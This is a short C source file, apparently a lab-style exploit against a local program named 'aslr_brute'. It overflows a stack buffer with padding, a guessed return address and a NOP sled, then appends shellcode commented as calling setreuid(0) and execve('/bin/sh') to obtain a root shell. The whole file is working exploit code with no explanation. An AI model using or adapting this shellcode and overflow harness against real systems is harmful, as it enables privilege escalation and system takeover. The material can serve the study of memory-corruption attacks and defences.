#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

unsigned long esp(void)
{
	asm("movl %esp, %eax"); //This inline asm prints esp
	asm("shr $4, %eax"); //getting rid of al since it is static
}

int main(void)
{
//Shellcode that calls setreuid() to 0 and execve() with /bin/sh
unsigned char scode[]="\x31\xc0\x31\xdb\x29\xc9\x89\xca\xb0\x46\xcd\x80\x29\xc0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x54\x89\xe1\xb0\x0b\xcd\x80";

//exact size of buffer when fully populated
char buffer[1651]; 

printf("\n\nASLR ESP at 0x%0x\n", esp());
//fill buffer with As to Return Pointer
memset(buffer, 0x41, 612);
//Our return  pointer guess
strcat(buffer+612, "\xc0\xef\xff\xbf"); 
//NOP sled
memset(buffer+616, 0x90, 1000);
//add shell code
memcpy(buffer+1616, scode, sizeof(scode));
//pass in our data to vuln program
execl("./aslr_brute","aslr_brute", buffer, NULL);
exit(0);
}
